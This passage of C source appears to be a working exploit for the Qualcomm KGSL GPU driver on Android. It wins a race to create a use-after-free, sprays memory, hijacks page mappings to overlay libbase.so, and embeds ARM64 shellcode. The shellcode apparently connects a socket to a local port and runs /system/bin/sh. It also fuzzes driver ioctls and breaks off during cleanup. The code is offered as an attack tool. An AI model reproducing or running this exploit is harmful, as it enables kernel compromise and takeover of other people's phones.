    mmap_spray_done = 0;
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        void *p;
        for (int j = 0; j < 5; j++)
        {
            p = mmap(addr + PAGE_SIZE * (uint64_t)sig_num[j], PAGE_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
            *(volatile uint8_t *)p = sig_num[j];
            if ((uint64_t)p != (uint64_t)addr + PAGE_SIZE * (uint64_t)sig_num[j])
            {
                fprintf(stderr, "[13] mmap_spray: failed at %p\n", p);
                break;
            }
        }
        mmap_spray_done++;
        if (i % 1000 == 0)
        {
            fprintf(stderr, "[13] Progress: %d/%d\n", i, MMAP_SPRAY_COUNT);
        }
    }
    fprintf(stderr, "[13] mmap-spray complete: %d pages\n", MMAP_SPRAY_COUNT);
}

static void mmap_spray_free(void)
{
    fprintf(stderr, "[CLEANUP] Freeing mmap spray...\n");
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        for (int j = 0; j < 5; j++)
        {
            munmap(addr + PAGE_SIZE * (uint64_t)sig_num[j], 0x1000);
        }
    }
    fprintf(stderr, "[CLEANUP] mmap spray freed\n");
}

static void mmap_check(void)
{
    uint64_t *check_addr = (uint64_t *)&gbuf[0xa00];
    int cnt = 0;
    uint32_t *corrupt_cnt = (uint32_t *)(gbuf + MMAP_CORRUPT_CNT);
    fprintf(stderr, "\n[14] mmap-checking user VA space\n");
    *corrupt_cnt = 0;

    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        uint8_t *pp = addr + PAGE_SIZE * (uint64_t)sig_num[0];
        if (*(volatile uint8_t *)pp != sig_num[0])
        {
            fprintf(stderr, "[14] PFN corrupted at 0x%llx!\n", (unsigned long long)addr);
            gb_target_addr = (uint64_t)addr;

            for (int k = 0; k < 10; k += 2)
            {
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                void *filled = mmap(hole_addr, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                    -1, 0);
                if (filled != MAP_FAILED)
                {
                    *(volatile uint8_t *)filled = 0xCC;
                }
            }
            for (int k = 10; k < 16; k += 1)
            {
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                void *filled = mmap(hole_addr, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                    -1, 0);
                if (filled != MAP_FAILED)
                {
                    *(volatile uint8_t *)filled = 0xCC;
                }
            }

            void *base = (void *)(addr + 0x10 * PAGE_SIZE);
            size_t len = 0x3e000;
            void *lib = mmap(base, len,
                             PROT_READ | PROT_EXEC,
                             MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
                             fd_lib, 0);

            if (lib == MAP_FAILED)
            {
                fprintf(stderr, "[14] mmap libbase error\n");
                perror("mmap libbase");
                exit(1);
            }
            else
            {
                fprintf(stderr, "[14] success mmap libbase : va: %p\n", lib);
                volatile uint8_t *p = (volatile uint8_t *)lib;
                for (size_t off = 0; off < 0x3e000; off += PAGE_SIZE)
                {
                    volatile uint8_t dummy = p[off];
                    (void)dummy;
                }
                *(uint64_t *)&gbuf[0x400] = (uint64_t)lib;
            }
        }
    }
    fprintf(stderr, "[14] mmap-check complete\n");
}

// ================== БЕЗОПАСНОЕ ИССЛЕДОВАНИЕ KGSL ==================
static void analyze_gpuobj_flags(int fd)
{
    fprintf(stderr, "[ANALYZE] Known KGSL_MEMFLAGS:\n");
    fprintf(stderr, "  KGSL_MEMFLAGS_USE_CPU_MAP = 0x%llx\n", KGSL_MEMFLAGS_USE_CPU_MAP);

    uint64_t test_flags[] = {
        0x00000000ULL,
        0x00000001ULL,
        0x00000002ULL,
        0x00000004ULL,
        0x00000008ULL,
        0x00000010ULL,
        0x00000020ULL,
        0x00000040ULL,
        0x00000080ULL,
        0x00000100ULL,
        0x00000200ULL,
        0x00000400ULL,
        0x00000800ULL,
        0x00001000ULL,
        0x00002000ULL,
        0x00004000ULL,
        0x00008000ULL,
        0x00010000ULL,
        0x00020000ULL,
        0x00040000ULL,
        0x00080000ULL,
        0x00100000ULL,
        0x00200000ULL,
        0x00400000ULL,
        0x00800000ULL,
        0x01000000ULL,
        0x02000000ULL,
        0x04000000ULL,
        0x08000000ULL,
        0x10000000ULL,
        0x20000000ULL,
        0x40000000ULL,
        0x80000000ULL,
        0xFFFFFFFFFFFFFFFFULL,
    };

    for (size_t i = 0; i < sizeof(test_flags) / sizeof(test_flags[0]); i++)
    {
        struct kgsl_gpuobj_alloc alloc = {
            .size = PAGE_SIZE,
            .flags = test_flags[i] | KGSL_MEMFLAGS_USE_CPU_MAP,
            .va_len = 0};

        int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc);
        if (ret == 0)
        {
            fprintf(stderr, "[ANALYZE] Flag 0x%llx: SUCCESS (id=%u)\n",
                    (unsigned long long)test_flags[i], alloc.id);
            struct kgsl_gpuobj_free fr = {.id = alloc.id};
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        }
        else if (errno != EINVAL)
        {
            fprintf(stderr, "[ANALYZE] Flag 0x%llx: errno=%d (%s)\n",
                    (unsigned long long)test_flags[i], errno, strerror(errno));
        }
    }
}

static void analyze_map_user_mem_types(int fd)
{
    fprintf(stderr, "[ANALYZE] Testing MAP_USER_MEM memtypes...\n");

    unsigned int memtypes[] = {
        0x00000000,
        0x00000001,
        0x00000002,
        0x00000003,
        0x00000004,
        0x00000005,
        0x00000006,
        0x00000007,
        0x00000008,
        0x00000009,
        0x0000000A,
        0x0000000B,
        0x0000000C,
        0x0000000D,
        0x0000000E,
        0x0000000F,
        0x00000010,
    };

    for (size_t i = 0; i < sizeof(memtypes) / sizeof(memtypes[0]); i++)
    {
        void *hostptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (hostptr == MAP_FAILED)
            continue;

        struct kgsl_map_user_mem req = {
            .fd = -1,
            .gpuaddr = 0,
            .len = PAGE_SIZE,
            .offset = 0,
            .hostptr = (unsigned long)hostptr,
            .memtype = memtypes[i],
            .flags = KGSL_MEMFLAGS_USE_CPU_MAP};

        int ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
        if (ret == 0)
            fprintf(stderr, "[ANALYZE] memtype 0x%02x: SUCCESS (gpuaddr=0x%lx)\n",
                    memtypes[i], req.gpuaddr);
        else if (errno != EINVAL)
            fprintf(stderr, "[ANALYZE] memtype 0x%02x: errno=%d (%s)\n",
                    memtypes[i], errno, strerror(errno));

        munmap(hostptr, PAGE_SIZE);
    }
}

static void discover_hidden_ioctls(int fd)
{
    fprintf(stderr, "[DISCOVER] Scanning for hidden IOCTLs (safe mode)...\n");

    struct
    {
        unsigned int cmd;
        const char *name;
    } known_ioctls[] = {
        {0x13, "DRAWCTXT_CREATE"},
        {0x14, "DRAWCTXT_DESTROY"},
        {0x15, "MAP_USER_MEM"},
        {0x16, "CMDSTREAM_READTIMESTAMP_CTXTID"},
        {0x17, "CMDSTREAM_WRITETIMESTAMP_CTXTID"},
        {0x18, "CMDSTREAM_QUEUE"},
        {0x19, "CMDSTREAM_ISSUE_IBC"},
        {0x1A, "CMDSTREAM_SYNCOBJ"},
        {0x1B, "CMDSTREAM_FENCE"},
        {0x1C, "CMDSTREAM_READTIMESTAMP"},
        {0x1D, "CMDSTREAM_READ"},
        {0x1E, "CMDSTREAM_WRITE"},
        {0x1F, "CMDSTREAM_READ_CTXT"},
        {0x20, "CMDSTREAM_WRITE_CTXT"},
        {0x21, "CMDSTREAM_READ_CTXTID"},
        {0x22, "CMDSTREAM_WRITE_CTXTID"},
        {0x23, "CMDSTREAM_READ_TIMESTAMP_CTXTID"},
        {0x24, "CMDSTREAM_WRITE_TIMESTAMP_CTXTID"},
        {0x25, "CMDSTREAM_READ_CTXTID_TIMESTAMP"},
        {0x26, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP"},
        {0x27, "CMDSTREAM_READ_CTXTID_TIMESTAMP_RETIRED"},
        {0x28, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_RETIRED"},
        {0x29, "CMDSTREAM_READ_CTXTID_TIMESTAMP_QUEUED"},
        {0x2A, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_QUEUED"},
        {0x2B, "CMDSTREAM_READ_CTXTID_TIMESTAMP_SUBMITTED"},
        {0x2C, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_SUBMITTED"},
        {0x2D, "CMDSTREAM_READ_CTXTID_TIMESTAMP_RETIRED_EXT"},
        {0x2E, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_RETIRED_EXT"},
        {0x2F, "CMDSTREAM_READ_CTXTID_TIMESTAMP_QUEUED_EXT"},
        {0x30, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_QUEUED_EXT"},
        {0x31, "CMDSTREAM_READ_CTXTID_TIMESTAMP_SUBMITTED_EXT"},
        {0x32, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_SUBMITTED_EXT"},
        {0x33, "CMDSTREAM_READ_CTXTID_TIMESTAMP_RETIRED_EXT2"},
        {0x34, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_RETIRED_EXT2"},
        {0x35, "CMDSTREAM_READ_CTXTID_TIMESTAMP_QUEUED_EXT2"},
        {0x36, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_QUEUED_EXT2"},
        {0x37, "CMDSTREAM_READ_CTXTID_TIMESTAMP_SUBMITTED_EXT2"},
        {0x38, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_SUBMITTED_EXT2"},
        {0x39, "CMDSTREAM_READ_CTXTID_TIMESTAMP_RETIRED_EXT3"},
        {0x3A, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_RETIRED_EXT3"},
        {0x3B, "CMDSTREAM_READ_CTXTID_TIMESTAMP_QUEUED_EXT3"},
        {0x3C, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_QUEUED_EXT3"},
        {0x3D, "CMDSTREAM_READ_CTXTID_TIMESTAMP_SUBMITTED_EXT3"},
        {0x3E, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_SUBMITTED_EXT3"},
        {0x3F, "CMDSTREAM_READ_CTXTID_TIMESTAMP_RETIRED_EXT4"},
        {0x40, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_RETIRED_EXT4"},
        {0x41, "CMDSTREAM_READ_CTXTID_TIMESTAMP_QUEUED_EXT4"},
        {0x42, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_QUEUED_EXT4"},
        {0x43, "CMDSTREAM_READ_CTXTID_TIMESTAMP_SUBMITTED_EXT4"},
        {0x44, "CMDSTREAM_WRITE_CTXTID_TIMESTAMP_SUBMITTED_EXT4"},
        {0x45, "GPUOBJ_ALLOC"},
        {0x46, "GPUOBJ_FREE"},
        {0x47, "GPUOBJ_INFO"},
        {0x48, "GPUOBJ_MAP"},
        {0x49, "GPUOBJ_UNMAP"},
        {0x4A, "GPU_COMMAND"},
        {0x4B, "GPU_COMMAND_QUEUE"},
        {0x4C, "GPU_COMMAND_ISSUE_IBC"},
        {0x4D, "GPU_COMMAND_SYNCOBJ"},
        {0x4E, "GPU_COMMAND_FENCE"},
        {0x4F, "GPU_COMMAND_READ"},
        {0x50, "GPU_COMMAND_WRITE"},
        {0x51, "GPU_COMMAND_READ_CTXT"},
        {0x52, "GPU_COMMAND_WRITE_CTXT"},
        {0x53, "GPU_COMMAND_READ_CTXTID"},
        {0x54, "GPU_COMMAND_WRITE_CTXTID"},
        {0x55, "GPU_COMMAND_READ_TIMESTAMP_CTXTID"},
        {0x56, "GPU_COMMAND_WRITE_TIMESTAMP_CTXTID"},
        {0x57, "GPU_COMMAND_READ_CTXTID_TIMESTAMP"},
        {0x58, "GPU_COMMAND_WRITE_CTXTID_TIMESTAMP"},
        {0x59, "GPU_COMMAND_READ_CTXTID_TIMESTAMP_RETIRED"},
        {0x5A, "GPU_COMMAND_WRITE_CTXTID_TIMESTAMP_RETIRED"},
        {0x5B, "GPU_COMMAND_READ_CTXTID_TIMESTAMP_QUEUED"},
        {0x5C, "GPU_COMMAND_WRITE_CTXTID_TIMESTAMP_QUEUED"},
        {0x5D, "GPU_COMMAND_READ_CTXTID_TIMESTAMP_SUBMITTED"},
        {0x5E, "GPU_COMMAND_WRITE_CTXTID_TIMESTAMP_SUBMITTED"},
    };

    for (unsigned int cmd = 0x60; cmd <= 0xFF; cmd++)
    {
        int found = 0;
        for (size_t i = 0; i < sizeof(known_ioctls) / sizeof(known_ioctls[0]); i++)
        {
            if (known_ioctls[i].cmd == cmd)
            {
                found = 1;
                break;
            }
        }
        if (found)
            continue;

        int ret = ioctl(fd, _IO(KGSL_IOC_TYPE, cmd));
        if (ret != -1)
            fprintf(stderr, "[DISCOVER] Found hidden IOCTL: 0x%02x (ret=%d)\n", cmd, ret);
    }
}

static void analyze_gpuobj_info(int fd, unsigned int id)
{
    struct kgsl_gpuobj_info info = {.id = id};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0)
    {
        fprintf(stderr, "[INFO] GPU object %u:\n", id);
        fprintf(stderr, "  gpuaddr: 0x%llx\n", info.gpuaddr);
        fprintf(stderr, "  flags:   0x%llx\n", info.flags);
        fprintf(stderr, "  size:    0x%llx\n", info.size);
        fprintf(stderr, "  va_len:  0x%llx\n", info.va_len);
        fprintf(stderr, "  va_addr: 0x%llx\n", info.va_addr);
        fprintf(stderr, "  Possible phys: 0x%llx\n", info.gpuaddr);
    }
}

static void analyze_gpu_command_flags(int fd)
{
    fprintf(stderr, "[ANALYZE] Testing GPU_COMMAND flags...\n");

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
    {
        fprintf(stderr, "[ANALYZE] Failed to create context\n");
        return;
    }

    uint64_t test_flags[] = {
        0x00000000,
        0x00000001,
        0x00000002,
        0x00000004,
        0x00000008,
        0x00000010,
        0x00000020,
        0x00000040,
        0x00000080,
        0x00000100,
        0x00000200,
        0x00000400,
        0x00000800,
        0x00001000,
        0x00002000,
        0x00004000,
        0x00008000,
        0x00010000,
        0x00020000,
        0x00040000,
        0x00080000,
        0x00100000,
        0x00200000,
        0x00400000,
        0x00800000,
        0x01000000,
        0x02000000,
        0x04000000,
        0x08000000,
        0x10000000,
        0x20000000,
        0x40000000,
        0x80000000,
    };

    for (size_t i = 0; i < sizeof(test_flags) / sizeof(test_flags[0]); i++)
    {
        struct kgsl_gpu_command cmd = {
            .flags = test_flags[i],
            .cmdlist = 0,
            .cmdsize = 0,
            .numcmds = 0,
            .objlist = 0,
            .objsize = 0,
            .numobjs = 0,
            .synclist = 0,
            .syncsize = 0,
            .numsyncs = 0,
            .context_id = ctx.drawctxt_id,
            .timestamp = 0};

        int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
        if (ret != -1 || errno != EINVAL)
            fprintf(stderr, "[ANALYZE] GPU_COMMAND flag 0x%llx: ret=%d, errno=%d\n",
                    (unsigned long long)test_flags[i], ret, errno);
    }
}

static void run_safe_explore(int fd, unsigned int uaf_id)
{
    fprintf(stderr, "\n[SAFE_EXPLORE] Starting safe KGSL exploration...\n");
    analyze_gpuobj_flags(fd);
    analyze_map_user_mem_types(fd);
    discover_hidden_ioctls(fd);
    if (uaf_id != 0)
        analyze_gpuobj_info(fd, uaf_id);
    analyze_gpu_command_flags(fd);
}

static void *bogus_racer(void *arg)
{
    race_state_t *rs = (race_state_t *)arg;

    while (!rs->ready)
    {
        __asm__ __volatile__("" ::: "memory");
    }

    rs->bogus_started = 1;
    __sync_synchronize();

    struct kgsl_map_user_mem req = {0};
    req.fd = -1;
    req.gpuaddr = 0;
    req.len = WRAP_SIZE;
    req.offset = 0;
    req.hostptr = BOGUS_START;
    req.memtype = KGSL_USER_MEM_TYPE_ADDR;
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

    int ret = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    int err = errno;

    rs->result = ret;
    rs->saved_errno = err;
    __sync_synchronize();

    return NULL;
}

char shellcode[287] = {0xff, 0x03, 0x03, 0xd1, 0xfd, 0x7b, 0x06, 0xa9, 0xfc, 0x6f, 0x07, 0xa9, 0xfa, 0x67, 0x08, 0xa9, 0xf8, 0x5f, 0x09, 0xa9, 0xf6, 0x57, 0x0a, 0xa9, 0xf4, 0x4f, 0x0b, 0xa9, 0xc8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x06, 0x00, 0x54, 0x00, 0x24, 0xa0, 0xf2, 0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0x03, 0x00, 0x80, 0xd2, 0x88, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x05, 0x00, 0x54, 0x40, 0x00, 0x80, 0xd2, 0x21, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0xc8, 0x18, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf3, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x05, 0x00, 0x10, 0x02, 0x02, 0x80, 0xd2, 0x68, 0x19, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x21, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x41, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x02, 0x00, 0x10, 0xf5, 0x03, 0x00, 0xaa, 0x16, 0x00, 0x80, 0xd2, 0xf5, 0x03, 0x00, 0xf9, 0xf6, 0x07, 0x00, 0xf9, 0xe1, 0x03, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2, 0xa8, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x80, 0xd2, 0xc8, 0x0b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf4, 0x4f, 0x4b, 0xa9, 0xf6, 0x57, 0x4a, 0xa9, 0xf8, 0x5f, 0x49, 0xa9, 0xfa, 0x67, 0x48, 0xa9, 0xfc, 0x6f, 0x47, 0xa9, 0xfd, 0x7b, 0x46, 0xa9, 0xff, 0x03, 0x03, 0x91, 0xc0, 0x03, 0x5f, 0xd6, 0x02, 0x00, 0x05, 0x39, 0x7f, 0x00, 0x00, 0x01, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00};

int main(int argc, char **argv)
{
    gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (gbuf == MAP_FAILED)
    {
        perror("mmap");
        exit(1);
    }
    fprintf(stderr, "main pid = %d, main ppid=%d\n", getpid(), getppid());
    gbuf[0x888] = 0;

    log_sync_state("parent-emit-0x11");
    gbuf[FOUND_PID] = 0x11;
    log_sync_state("parent-post-emit-0x11");

    int pid = fork();
    if (!pid)
    {
        fprintf(stderr, "[CHILD1] Started\n");
        int pid2 = fork();
        if (!pid2)
        {
            if (!wait_for_flag_u8(&gbuf[FOUND_PID], 0x11, 2000) &&
                !wait_for_flag_u8(&gbuf[FOUND_PID], 0x12, 2000))
            {
                fprintf(stderr, "[!] child2 did not receive sync, continuing without it\n");
                log_sync_state("child2-timeout");
            }
            else
            {
                fprintf(stderr, "[CHILD2] pid = %d, ppid=%d\n", getpid(), getppid());
            }
            sleep(2);
            gbuf[CALL_LOGLINE] = 0x11;
            return 0;
        }
        else
        {
            if (!wait_for_flag_u8(&gbuf[FOUND_PID], 0x11, 2000) &&
                !wait_for_flag_u8(&gbuf[FOUND_PID], 0x12, 2000))
            {
                fprintf(stderr, "[!] child1 did not receive sync, continuing without it\n");
                log_sync_state("child1-timeout");
            }
            else
            {
                fprintf(stderr, "[CHILD1] pid = %d, ppid=%d\n", getpid(), getppid());
            }
            log_sync_state("child1-emit-0x12");
            gbuf[FOUND_PID] = 0x12;
            log_sync_state("child1-post-emit-0x12");
            return 0;
        }
    }

    fd_shellcode = open("./shellcode", O_RDWR | O_CREAT | O_TRUNC, 0777);
    write(fd_shellcode, shellcode, 287);

    char *path = "/system/lib64/libbase.so";
    fd_lib = open(path, O_RDONLY);
    if (fd_lib < 0)
        perror("open");

    if (fstat(fd_lib, &st) < 0)
    {
        close(fd_lib);
        return 0;
    }

    spray_ctrl = mmap(NULL,
                      sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
                      PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS,
                      -1, 0);
    if (spray_ctrl == MAP_FAILED)
    {
        perror("mmap spray_ctrl");
        exit(1);
    }
    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);

restart:;
    unsigned int uaf_id = 0, overlap_id = 0, ph_id = 0;
    uint64_t uaf_mmapsize = 0, overlap_mmapsize = 0, ph_mmapsize = 0;
    void *uaf_vma = NULL, *bogus_vma = NULL, *ph_vma = NULL, *overlap_vma = NULL;
    int success = 0;
    int retries = 20;

    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0)
    {
        perror("open /dev/kgsl-3d0");
        return 1;
    }

    fprintf(stderr, "[1] UAF GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc uaf_alloc = {0};
    uaf_alloc.size = UAF_SIZE;
    uaf_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    uaf_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0)
    {
        fprintf(stderr, "[!] UAF alloc failed: %s\n", strerror(errno));
        return 1;
    }
    uaf_id = uaf_alloc.id;
    uaf_mmapsize = uaf_alloc.mmapsize;
    g_uaf_id = uaf_id;
    g_uaf_mmapsize = uaf_mmapsize;
    fprintf(stderr, "    UAF id=%u mmapsize=0x%llx\n", uaf_id,
            (unsigned long long)uaf_mmapsize);

    if (getenv("KGSL_SAFE_EXPLORE") != NULL && strcmp(getenv("KGSL_SAFE_EXPLORE"), "1") == 0)
    {
        run_safe_explore(fd, uaf_id);
    }

    fprintf(stderr, "\n[2] OVERLAP GPUOBJ_ALLOC (no mmap yet)\n");
    struct kgsl_gpuobj_alloc overlap_alloc = {0};
    overlap_alloc.size = OVERLAP_SIZE;
    overlap_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    overlap_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0)
    {
        fprintf(stderr, "[!] OVERLAP alloc failed: %s\n", strerror(errno));
        return 1;
    }
    overlap_id = overlap_alloc.id;
    overlap_mmapsize = overlap_alloc.mmapsize;
    fprintf(stderr, "    OVERLAP id=%u mmapsize=0x%llx\n", overlap_id,
            (unsigned long long)overlap_mmapsize);

    fprintf(stderr, "\n[3] UAF mmap() at FIXED 0x%llx\n",
            (unsigned long long)UAF_START);
    uaf_vma = mmap_gpuobj_fixed(fd, uaf_id, uaf_mmapsize, (void *)(uintptr_t)UAF_START);
    if (uaf_vma == MAP_FAILED)
    {
        fprintf(stderr, "[!] UAF mmap failed: %s\n", strerror(errno));
        return 1;
    }
    g_uaf_mmap_ptr = uaf_vma;
    fprintf(stderr, "    UAF mapped at %p (requested 0x%llx)\n",
            uaf_vma, (unsigned long long)UAF_START);

    for (size_t i = 0; i < uaf_mmapsize; i += PAGE_SIZE)
    {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    fprintf(stderr, "    Touched %llu pages\n",
            (unsigned long long)(uaf_mmapsize / PAGE_SIZE));

    fprintf(stderr, "\n[4] UAF munmap()\n");
    fprintf(stderr, "    Note: rbtree entry and IOMMU PTEs remain\n");
    munmap(uaf_vma, uaf_mmapsize);
    uaf_vma = NULL;
    usleep(200);

    fprintf(stderr, "\n[5] Anonymous mmap at 0x%llx (3 pages)\n",
            (unsigned long long)BOGUS_START);
    bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
    if (bogus_vma == MAP_FAILED || (uint64_t)bogus_vma != BOGUS_START)
    {
        fprintf(stderr, "[!] BOGUS mmap failed: %s\n", strerror(errno));
        return 1;
    }
    for (int i = 0; i < 3; i++)
    {
        ((volatile char *)bogus_vma)[i * PAGE_SIZE] = 1;
    }
    fprintf(stderr, "    BOGUS VMA at %p\n", bogus_vma);

    fprintf(stderr, "\n[6] PLACEHOLDER GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc ph_alloc = {0};
    ph_alloc.size = PLACEH_SIZE;
    ph_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    ph_alloc.va_len = 0;

    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0)
    {
        fprintf(stderr, "[!] PLACEHOLDER alloc failed: %s\n", strerror(errno));
        return 1;
    }
    ph_id = ph_alloc.id;
    ph_mmapsize = ph_alloc.mmapsize;
    fprintf(stderr, "    PLACEHOLDER id=%u mmapsize=0x%llx\n", ph_id,
            (unsigned long long)ph_mmapsize);

    fprintf(stderr, "\n[7] PLACEHOLDER mmap() at FIXED 0x%llx\n",
            (unsigned long long)PLACEH_START);
    ph_vma = mmap_gpuobj_fixed(fd, ph_id, ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
    if (ph_vma == MAP_FAILED)
    {
        fprintf(stderr, "[!] PLACEHOLDER mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    PLACEHOLDER mapped at %p (requested 0x%llx)\n",
            ph_vma, (unsigned long long)PLACEH_START);

    for (size_t i = 0; i < ph_mmapsize; i += (PAGE_SIZE * 1024))
    {
        ((volatile char *)ph_vma)[i] = 1;
    }

    int mmap_errno = 0;

    fprintf(stderr, "[8] Main thread will mmap OVERLAP\n\n");

    for (int attempt = 0; attempt < 4; ++attempt)
    {
        race_state_t rs = {
            .fd = fd,
            .ready = 0,
            .bogus_started = 0,
            .result = -1,
            .saved_errno = 0};

        pthread_t bogus_thread;
        if (pthread_create(&bogus_thread, NULL, bogus_racer, &rs) != 0)
        {
            fprintf(stderr, "[!] pthread_create failed on overlap attempt %d\n", attempt);
            break;
        }

        rs.ready = 1;
        __sync_synchronize();

        int timeout = 0;
        while (!rs.bogus_started && timeout < 1000)
        {
            __asm__ __volatile__("" ::: "memory");
            timeout++;
        }

        usleep(200 + (unsigned int)attempt * 300);

        fprintf(stderr, "[9] OVERLAP mmap() attempt %d at FIXED 0x%llx during race\n",
                attempt, (unsigned long long)OVERLAP_START);

        overlap_vma = mmap_gpuobj_fixed_strict(fd, overlap_id, overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
        mmap_errno = errno;

        pthread_join(bogus_thread, NULL);

        fprintf(stderr, "    OVERLAP mmap result: %s\n",
                overlap_vma == MAP_FAILED ? "FAILED" : "SUCCESS");

        if (overlap_vma == MAP_FAILED)
        {
            fprintf(stderr, "      errno=%d (%s)\n", mmap_errno, strerror(mmap_errno));
            fprintf(stderr, "\n[!] RACE CONDITION WON on attempt %d!\n", attempt);
            success = 1;
            break;
        }
        else
        {
            fprintf(stderr, "      mapped at %p (requested 0x%llx)\n",
                    overlap_vma, (unsigned long long)OVERLAP_START);
            if (overlap_vma != MAP_FAILED && overlap_vma != NULL)
            {
                munmap(overlap_vma, overlap_mmapsize);
                overlap_vma = NULL;
            }
        }

        if (attempt < 3)
            usleep(1000 + (unsigned int)attempt * 500);
    }

    if (!success)
    {
        fprintf(stderr, "[-] Race failed (errno=%d), retrying...\n", mmap_errno);
        if (overlap_vma != MAP_FAILED && overlap_vma != NULL)
        {
            munmap(overlap_vma, overlap_mmapsize);
        }
        if (ph_vma != MAP_FAILED && ph_vma != NULL)
        {
            munmap(ph_vma, ph_mmapsize);
        }
        if (bogus_vma != MAP_FAILED && bogus_vma != NULL)
        {
            munmap(bogus_vma, PAGE_SIZE * 3);
        }

        struct kgsl_gpuobj_free free_obj;
        free_obj.flags = 0;
        if (overlap_id)
        {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (ph_id)
        {
